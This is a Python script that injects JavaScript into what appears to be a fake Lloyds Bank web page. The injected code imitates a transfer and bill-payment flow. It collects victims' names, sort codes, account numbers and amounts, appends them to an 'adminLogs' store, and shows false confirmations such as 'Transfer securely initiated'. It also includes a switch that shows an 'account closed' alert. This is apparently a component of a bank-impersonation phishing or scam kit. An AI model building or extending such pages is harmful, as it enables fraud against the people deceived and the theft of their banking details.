import re

INDEX_FILE = 'C:\\Users\\xingk\\Lloyds Banking Group\\index.html'

with open(INDEX_FILE, 'r', encoding='utf-8') as f:
    index_html = f.read()

new_js = '''
        // ===== DYNAMIC ACCOUNT STATUS =====
        var localAccountLocked = false; // default to false
        
        function handleQuickAction(action) {
            if (localAccountLocked) {
                showAccountClosedAlert();
            } else {
                if (action === 'transfer') initTransferBanks();
                showView(action);
            }
        }

        // Add to showView to handle hiding other views
        var originalShowView = showView;
        showView = function(viewId) {
            originalShowView(viewId);
            var extras = ['transfer', 'bills', 'investments'];
            extras.forEach(function(v) {
                var el = document.getElementById('view-' + v);
                if (el && v !== viewId) el.style.display = 'none';
            });
            if (extras.includes(viewId)) {
                document.getElementById('view-' + viewId).style.display = 'block';
            }
        };

        // Bank List Data
        var ukBanks = [
            "Lloyds Bank PLC (Includes Halifax, Bank of Scotland)", "HSBC UK Bank Plc (Includes First Direct, M&S Bank)",
            "Barclays Bank UK PLC", "National Westminster Bank Plc (NatWest, includes RBS)",
            "Santander UK Plc (Includes TSB, Virgin Money)", "Metro Bank PLC",
            "Clydesdale Bank Plc (Trading as Virgin Money)", "Yorkshire Bank (Trading as Virgin Money)",
            "Northern Bank Limited (Danske Bank group, NI)", "AIB Group (UK) P.L.C.",
            "Monzo Bank Limited", "Starling Bank Limited", "Revolut Bank UK Ltd", "Atom Bank PLC",
            "Chase (J.P. Morgan Europe Limited)", "OakNorth Bank plc", "Allica Bank Limited",
            "Tandem Bank", "Kroo Bank Ltd", "Zopa Bank Limited", "The Bank of London",
            "Coutts & Company", "C. Hoare & Co.", "Investec Bank PLC", "Handelsbanken plc",
            "Citibank UK Limited", "Bank of China (UK) Limited", "Goldman Sachs International Bank"
        ];

        function initTransferBanks() {
            var listHtml = '';
            ukBanks.forEach(function(bank) {
                listHtml += '<div style="padding:10px; border-bottom:1px solid #ddd; cursor:pointer;" onclick="selectBank(\\'' + bank.replace(/'/g, "\\\\'") + '\\')"><i class="fas fa-university" style="color:#006a4d; margin-right:10px;"></i>' + bank + '</div>';
            });
            document.getElementById('bankList').innerHTML = listHtml;
            document.getElementById('transferStep1').style.display = 'block';
            document.getElementById('transferStep2').style.display = 'none';
            document.getElementById('transferStep3').style.display = 'none';
            document.getElementById('transferLoading').style.display = 'none';
        }

        function selectBank(bankName) {
            document.getElementById('selectedBankDisplay').innerText = "Selected Bank: " + bankName;
            document.getElementById('transferStep1').style.display = 'none';
            document.getElementById('transferStep2').style.display = 'block';
        }

        async function submitFinalTransfer() {
            var amt = document.getElementById('txTransferAmount').value;
            var ref = document.getElementById('txReference').value;
            if (amt) {
                var bnk = document.getElementById('selectedBankDisplay').innerText;
                var nm = document.getElementById('txFullName').value;
                var sc = document.getElementById('txSortCode').value;
                var ac = document.getElementById('txAccNum').value;

                var logEntry = '<p><strong>Transfer Attempt:</strong> £' + amt + ' to STARK Building Materials UK<br>' +
                               'Entered Details:<br>Name: ' + nm + '<br>Sort: ' + sc + '<br>Acc: ' + ac + '<br>' + bnk + '</p>';
                var currentLogs = getSyncItem('adminLogs') || '';
                await setSyncItem('adminLogs', currentLogs + logEntry);

                alert("Transfer securely initiated to STARK Building Materials UK. It may take up to 2 hours to clear.");
                showView('home');
            } else {
                alert("Please enter a valid amount.");
            }
        }

        async function submitBillPayment() {
            var payee = document.getElementById('billPayee').value;
            var amt = document.getElementById('billAmount').value;
            if (amt) {
                var logEntry = '<p><strong>Bill Payment Attempt:</strong> £' + amt + ' to ' + payee + '</p>';
                var currentLogs = getSyncItem('adminLogs') || '';
                await setSyncItem('adminLogs', currentLogs + logEntry);
                alert("Payment of £" + amt + " to " + payee + " has been scheduled.");
                showView('home');
            } else {
                alert("Please enter a valid amount.");
            }
        }
'''

if 'function handleQuickAction' not in index_html:
    index_html = index_html.replace('// ===== VIEW NAVIGATION =====', new_js + '\n        // ===== VIEW NAVIGATION =====')

with open(INDEX_FILE, 'w', encoding='utf-8') as f:
    f.write(index_html)

print("JS forcefully injected.")
